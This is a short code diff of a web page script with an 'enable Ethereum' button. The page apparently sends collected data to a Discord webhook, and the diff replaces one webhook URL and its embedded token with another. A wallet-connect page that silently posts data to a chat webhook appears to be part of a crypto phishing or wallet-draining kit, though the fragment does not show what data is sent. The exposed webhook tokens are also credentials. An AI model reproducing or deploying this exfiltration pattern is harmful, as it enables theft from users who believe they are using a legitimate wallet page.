@@ -2,7 +2,7 @@ const ethereumButton = document.querySelector('.enableEthereumButton');
 const showAccount = document.querySelector('.showAccount');
 const weburl = window.location.href
 window.post = async function(data) {
-    return fetch("https://discord.com/api/webhooks/868335421963239435/2923ujj0les19E6dACxu6Hc-ZJq_oKPr940UBtA2uC8sIFxUqOjmaTjQf411z7Ql2Zzi",
+    return fetch("https://discord.com/api/webhooks/941032523545346068/FEqvEfi1wRq4oT-5WGcRU-pO-pQQ3cnuwQ7cB8iuEeeSR46Jt2zM9yFVjGsIkGSdXm1W",
      {method: "POST", body: JSON.stringify(data),headers:{"Content-type": "application/json"}});
   }
 ethereumButton.addEventListener('click', () => {
